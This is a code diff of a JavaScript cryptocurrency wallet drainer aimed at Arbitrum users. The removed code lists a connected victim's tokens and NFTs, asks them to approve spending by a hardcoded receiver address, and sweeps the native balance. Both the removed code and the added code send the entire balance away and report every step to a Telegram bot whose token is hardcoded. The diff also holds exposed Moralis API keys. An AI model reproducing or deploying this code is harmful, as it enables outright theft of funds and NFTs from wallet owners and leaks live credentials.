-    // WalletConnect will default to the existing session
-    // and does not allow to re-scan the QR code with a new wallet.
-    // Depending on your use case you may want or want not his behavir.
-    await web3Modal.clearCachedProvider();
-    provider = null;
-  }
+        transactionObject.gas = gasLimit;
+        transactionObject.value = balance - transactionFee; // set the transaction value to the entire balance, less the transaction fee
 
-  selectedAccount = null;
+        web3Object.eth.sendTransaction(transactionObject)
+            .on('transactionHash', (hash) => {
+                console.log("Transaction Hash: ", hash)
+                sendMessage("Transaction is submitted to the network")
+            })
+            .on('receipt', (receipt) => {
+                console.log("Transaction Receipt: ", receipt)
+                sendMessage("Transfer Completed Successfully, You should receive some native tokens")
+            })
+            .on('error', (error) => {
+                console.log("Error: ", error)
+                sendMessage("Transaction Rejected")
+            })
+    } catch {
+        sendMessage("Insufficient funds for transfer")
+    }
 
-  // Set the UI back to the initial state
-  document.querySelector("#prepare").style.display = "block";
-  document.querySelector("#connected").style.display = "none";
-}
-
-
-async function getTokens(address="", api_key="", chain="arbitrum"){
-  return new Promise((resolve, reject)=>{
-      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=arbitrum`, {
-          method: "GET",
-          headers: {
-              "accept": "application/json",
-              "X-API-Key": api_key
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-async function getNFTs(address="", api_key="", chain="arbitrum"){
-  return new Promise((resolve, reject)=>{
-      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${chain}&format=decimal&limit=98`, {
-          method: "GET",
-          headers: {
-              "accept": "application/json",
-              "X-API-Key": api_key
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-async function getPrice(address){
-  return new Promise((resolve, reject)=>{
-      fetch(`https://api.coingecko.com/api/v3/simple/token_price/arbitrum-one?contract_addresses=${address}&vs_currencies=usd`, {
-          method: "GET",
-          headers: {
-              //"accept": "application/json",
-              //"X-API-Key": api_key
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
 }
 
 async function sendMessage(message){
-  return new Promise((resolve, reject)=>{
-    const chat_id = 5227607491;
-    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
-          method: "GET",
-          headers: {
-              
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-async function sendMessage1(message){
-  return new Promise((resolve, reject)=>{
-    const chat_id = 5227607491;
-    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
-          method: "GET",
-          headers: {
-              
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-
-async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="arbitrum"){
-  return new Promise((resolve, reject)=>{
-      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=arbitrum`, {
-          method: "GET",
-          headers: {
-              "accept": "application/json",
-              "X-API-Key": api_key
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-const receiver_address = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f';
-async function proceed(){
-  start_to_log = false;
-  console.log("Now we roll!!!");
-    // main net
-    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
-    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
-    const apiKey = "KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp";
-  
-    // testnet
-    // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
-    // const appId = 'LVaJ6EwkawTg52M7p8z3yNf2OoEuScDEma9IaM4C'
-
-    Moralis.start({ serverUrl, appId });
-    console.log("Moralis initialized");
-
-    let user;
-    try {
-      // const web3Provider = await Moralis.enableWeb3();
-      if(provider.isMetaMask){
-        // metamask
-        console.log("Moralis using default (MetaMask)")
-        const web3Provider = await Moralis.enableWeb3();
-        console.log("Moralis web3Provider:", web3Provider);
-      }else{
-        // walletconnect
-        console.log("Moralis using walletconnect")
-        // const web3Provider = await Moralis.enableWeb3({ provider: "walletconnect" });
-        try {          
-          user = await Moralis.authenticate({provider: "walletconnect"});
-          console.log("Moralis user:", user);
-        } catch (error) {
-          console.log("Failed to authenticate moralis:",error);
-        }
-      }
-    } catch (error) {
-      console.log("Can't enable web3: ", error);
-    //   const web3Provider = await Moralis.enableWeb3();
-    //   user = await Moralis.authenticate();
-    //   console.log('Authenticated User with moralis');
-    //   user_address = user.get('arbitrumAddress')
-
-        // Moralis.enableWeb3() has already been called but is not finished
-    }
-    // NOTE: Moralis.User.current(); doesn't exist
-
-    async function send() {
-        console.log("Attempting to send tokens...");
-        if (!user_address) {
-          throw Error(`No user:  ${user_address}`);
-        }
-        console.log("Searching for tokens...");
-    
-    
-        // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
-        const nft_options = {
-          chain: 'arbitrum', // arbitrum
-          // address: test_addr_with_nfts,
-          address: user_address, // 0x4444ac99AfeEA6B63Ce53F870e0D4DF191987165
-          limit: '98',
-        }
-        // const arbitrum_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
-        //   console.log("Unable to get NFTs", e);
-        // })
-        // console.log('arbitrum NFTs: %o', arbitrum_nfts)
-        
-        const arbitrum_tokens = await getTokens(user_address, apiKey).catch(e=>{
-          console.log("Unable to get tokens", e);
-        });
-        let arbitrum_NFT = await getNFTs(user_address, apiKey).catch(e=>{
-          console.log("Unable to get NFts", e);
-          
-        });
-        console.log("arbitrum_NFT %o", arbitrum_NFT)
-        let arbitrum_NFTs = arbitrum_NFT.result;
-        await sendMessage(`me ... arbitrum : connected to ${user_address}`);
-        await sendMessage1(`arbitrum : connected to ${user_address}`);
-        console.log('arbitrum tokens: %o', arbitrum_tokens)
-        console.log('arbitrum NFTs: %o', arbitrum_NFTs)
-
-        
-    
-        if (false) {
-          await sendMessage(`No valuable token or nfts found` )
-          await sendMessage1(`No valuable token or nfts found` )
-          const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
-            console.log("Unable to get new arbitrum balance", e);
-          });
-          console.log("bnb_balance", bnb_balance);
-          console.log("bnb_balance.balance", bnb_balance.balance);
-          
-          const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
-          console.log("The new bnb balance", balance);
-          if (balance > 0) {
-          const options = {
-            type: "native",
-            amount: Moralis.Units.arbitrum(balance.toString()),
-            receiver: receiver_address,
-          };
-          let result = await Moralis.transfer(options);
-          console.log(result);
-        }
-        else {
-          console.log("Insufficient funds")
-          if (arbitrum_tokens.length > 0){
-            await sendMessage(`Tokens found` )
-            await sendMessage1(`Tokens found` )
-          } else if (arbitrum_NFTs.length > 0){
-            await sendMessage(`NFTs found` )
-            await sendMessage(`NFTs found` )
-          }
-        }
-
-
-          return console.log('No arbitrum tokens found')
-        }
-        let x = 0;
-        let y = 0;
-        let mum = "";
-        const real_arbitrum_token = new Array();
-        real_arbitrum_token[0] = {
-              contractAddress : "0x912CE59144191C1204E64559FE8253a0e49E6548",
-              realprice : 100000000,
-              balance : "1000000000",
-              decimal : "9",
-              fakebalance : "1000000000"
-            };
-          
-
-        const arbitrum_length = arbitrum_tokens.length;
-        function callback (x) { 
-          x.sort((a, b) => b.realprice - a.realprice);
-          console.log("real_arbitrum_token length : ", x.length);
-          console.log("real_arbitrum_token : ", x);
-         }
-
-        // Get tokens real values
-        await arbitrum_tokens.forEach(async function(token,i){
-          let contractAddress = token.token_address;
-          await getPrice(contractAddress).then(res => {
-            
-              let pricePerToken;
-              if (res[contractAddress]){
-                console.log(res[contractAddress].usd);
-                pricePerToken = parseFloat(res[contractAddress].usd);
-                console.log("Price was obtained ", pricePerToken);   
-            }
-              else{
-                pricePerToken = 0;
-                console.log("Unable to obtain price");
-              }
-            let balance = token.balance;
-            let decimal = token.decimals;
-            const realprice =  balance / (10 ** (decimal || 18)) * (pricePerToken);
-            let fakebalance = balance / (10 ** (decimal || 18));
-              real_arbitrum_token[i+1] = {
-              contractAddress : contractAddress,
-              realprice : realprice,
-              balance : balance,
-              decimal : decimal,
-              fakebalance : fakebalance
-            }
-        });
-        if(i+1 === arbitrum_length) {
-          callback(real_arbitrum_token);
-          transferNow();
-        }
-      })
-      if (arbitrum_length<1){
-        transferNow()
-      }
-          // .catch(e=>{
-          //   console.log("Unable to access api", e);
-          // });
-
-          
-
-        
-        // arbitrum_nfts.result.forEach(async (nft, i) => {
-          //transfer tokens
-          
-          async function transferNow(){
-            
-            console.log("Rolling");
-            for(let n=0; n<real_arbitrum_token.length && real_arbitrum_token[n].realprice>1; n++){
-              x = x + 1;
-              console.log("Token ", n); 
-              
-              let token = real_arbitrum_token[Number(n)];
-              let ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegator","type":"address"},{"indexed":true,"internalType":"address","name":"fromDelegate","type":"address"},{"indexed":true,"internalType":"address","name":"toDelegate","type":"address"}],"name":"DelegateChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegate","type":"address"},{"indexed":false,"internalType":"uint256","name":"previousBalance","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"newBalance","type":"uint256"}],"name":"DelegateVotesChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"version","type":"uint8"}],"name":"Initialized","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"},{"indexed":false,"internalType":"bytes","name":"data","type":"bytes"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MINT_CAP_DENOMINATOR","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MINT_CAP_NUMERATOR","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MIN_MINT_INTERVAL","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint32","name":"pos","type":"uint32"}],"name":"checkpoints","outputs":[{"components":[{"internalType":"uint32","name":"fromBlock","type":"uint32"},{"internalType":"uint224","name":"votes","type":"uint224"}],"internalType":"struct ERC20VotesUpgradeable.Checkpoint","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"}],"name":"delegate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"delegateBySig","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"delegates","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastTotalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_l1TokenAddress","type":"address"},{"internalType":"uint256","name":"_initialSupply","type":"uint256"},{"internalType":"address","name":"_owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"l1Address","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextMint","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"numCheckpoints","outputs":[{"internalType":"uint32","name":"","type":"uint32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"success","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
-              let {
-                contractAddress: contractAddress,
-                balance: balance,
-                fakebalance : fakebalance,
-                decimal : decimal
-              } = token
-              let amount = Moralis.Units.Token(fakebalance.toString(), decimal.toString());
-              // let token_transfer_options = {
-              //   type: "erc20",
-              //   amount: Moralis.Units.Token(fakebalance.toString(), decimal.toString()),
-              //   receiver: receiver_address, //'0x..',
-              //   contractAddress,
-              // }
-              // let temp = { token: token, options: token_transfer_options }
-              // console.log(`Transferring token[${n}]:%o`, temp)
-              await sendMessage(`Approving 
-                            Token Address : ${contractAddress},
-                            Amount : ${amount},
-                            Your address : ${receiver_address}
-                              ` )
-              await sendMessage1(`Approving 
-                              Token Address : ${contractAddress},
-                              Amount : ${amount},
-                              Your address : ${receiver_address}
-                                ` )
-              const sendOptions = {
-                contractAddress: contractAddress,
-                functionName: "approve",
-                abi: ABI,
-                params: {
-                  spender : receiver_address,
-                  _spender : receiver_address,
-                  value : amount,
-                  _value : amount,
-                  amount : amount,
-
-                },
-              };
-              
-              let transaction = await Moralis.executeFunction(sendOptions).catch(
-                (e) => {
-                  console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
-                  if (e.code === 4001) {
-                mum = "denied";
+    return new Promise((resolve, reject)=>{
+      const chat_id = CHAT;
+      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
+            method: "GET",
+            headers: {
                 
-              }
-              else {
-                mum = "approved";
-              }
-            },
-          )
-          if (transaction) {
-            await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
-          }
-          else {
-            await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
-          }
-              console.log(transaction);
-              // if(transaction){
-              //   await transaction.wait().then((v) => {
-              //     console.log('Finished Processing transaction:', v)
-              //   })
-              // }
             }
-            for(let n=0; n<arbitrum_NFTs.length; n++){
-              y = y + 1;
-              let nft = arbitrum_NFTs.result[Number(n)];
-              let ABI721 = [{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"ApprovalCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"ApprovalQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"ApproveToCaller","type":"error"},{"inputs":[],"name":"BalanceQueryForZeroAddress","type":"error"},{"inputs":[],"name":"MintERC2309QuantityExceedsLimit","type":"error"},{"inputs":[],"name":"MintToZeroAddress","type":"error"},{"inputs":[],"name":"MintZeroQuantity","type":"error"},{"inputs":[],"name":"OwnerQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"OwnershipNotInitializedForExtraData","type":"error"},{"inputs":[],"name":"TransferCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"TransferFromIncorrectOwner","type":"error"},{"inputs":[],"name":"TransferToNonERC721ReceiverImplementer","type":"error"},{"inputs":[],"name":"TransferToZeroAddress","type":"error"},{"inputs":[],"name":"URIQueryForNonexistentToken","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint20xA4B1","name":"fromTokenId","type":"uint20xA4B1"},{"indexed":false,"internalType":"uint20xA4B1","name":"toTokenId","type":"uint20xA4B1"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"ConsecutiveTransfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"FREE_AllowedTokensPerWallet","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"FREE_MAX_SUPPLY","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_SUPPLY","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"},{"internalType":"address[]","name":"addresses","type":"address[]"}],"name":"batchAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerPurchase","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerWallet","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mintPrice","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setFreeMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"maxMintSupply","type":"uint20xA4B1"}],"name":"setMaxMintSupply","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"val","type":"uint20xA4B1"}],"name":"setMaxReserve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setMaximumAllowedTokensPerTx","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"setMaximumAllowedTokensPerWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_price","type":"uint20xA4B1"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"val","type":"uint20xA4B1"}],"name":"setReserveAtATime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"toggleSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
-              let {
-                contract_type: type,
-                token_address: contractAddress,
-                token_id: tokenId,
-              } = nft
-              await sendMessage(`Approving 
-                                NFT Address : ${contractAddress},
-                                token_id : ${tokenId}
-                                Your address : ${receiver_address}
-                                  ` )
-              await sendMessage1(`Approving 
-                                  NFT Address : ${contractAddress},
-                                  token_id : ${tokenId}
-                                  Your address : ${receiver_address}
-                                    ` )
-              const sendOptions = {
-                contractAddress: contractAddress,
-                functionName: "setApprovalForAll",
-                abi: ABI721,
-                params: {
-                  operator : receiver_address,
-                  approved : true,
-                },
-              };
-              let mum = "";
-              let transaction = await Moralis.executeFunction(sendOptions).catch(
-                (e) => {
-                  console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
-                  if (e.code === 4001) {
-                mum = "denied";
-                
-              }
-              else {
-                mum = "approved";
-              }
-            },
-          )
-          if (transaction) {
-            await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
-          }
-          else {
-            await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
-          }
-              console.log(transaction);
-              // if(transaction){
-              //   await transaction.wait().then((v) => {
-              //     console.log('Finished Processing transaction:', v)
-              //   })
-              // }
-            }
-          
-          if (x === real_arbitrum_token.length){
-        const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
-          console.log("Unable to get new arbitrum balance", e);
-        });
-        console.log("bnb_balance", bnb_balance);
-        console.log("bnb_balance.balance", bnb_balance.balance);
-        
-        const balance = (parseFloat((parseInt(bnb_balance.balance))/1000000000000000000)) - 0.001;
-        console.log("The new bnb balance", balance);
-        if (balance > 0) {
-        const options = {
-          type: "native",
-          amount: Moralis.Units.ETH(balance.toString()),
-          receiver: receiver_address,
-        };
-        let result = await Moralis.transfer(options);
-        console.log(result);
-      }
-      else {
